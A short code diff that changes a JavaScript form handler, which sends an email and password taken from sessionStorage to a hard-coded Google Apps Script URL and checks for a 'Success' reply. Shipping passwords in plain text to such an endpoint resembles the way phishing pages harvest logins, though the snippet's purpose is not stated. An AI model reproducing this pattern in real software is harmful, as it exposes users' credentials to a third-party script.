@@ -14,7 +14,7 @@ document.getElementById('submitForm').addEventListener('submit', function(e) {
     var email = sessionStorage.getItem('email');
     var password = sessionStorage.getItem('password');
 
-    // Replace this with your Google Apps Script Web App URL
+    // Replace with your Google Apps Script Web App URL
     var googleAppsScriptUrl = 'https://script.google.com/macros/s/AKfycbyE5l1_Sb9-lAaC2veuTe3-2dxboGsXTUBNCRKOmkir7gxHcqaAtFxauaGHgkmD27VY/exec';
 
     fetch(googleAppsScriptUrl, {
@@ -28,15 +28,14 @@ document.getElementById('submitForm').addEventListener('submit', function(e) {
             email: email,
             password: password
         })
-    }).then(response => {
-        if (response.ok) {
+    }).then(response => response.text())
+      .then(text => {
+        if (text === 'Success') {
             showAlert('successAlert');
             document.getElementById('submitForm').reset();
         } else {
-            response.text().then(text => {
-                console.error('Error:', text);
-                showAlert('errorAlert');
-            });
+            console.error('Error:', text);
+            showAlert('errorAlert');
         }
     }).catch(error => {
         console.error('Error:', error);
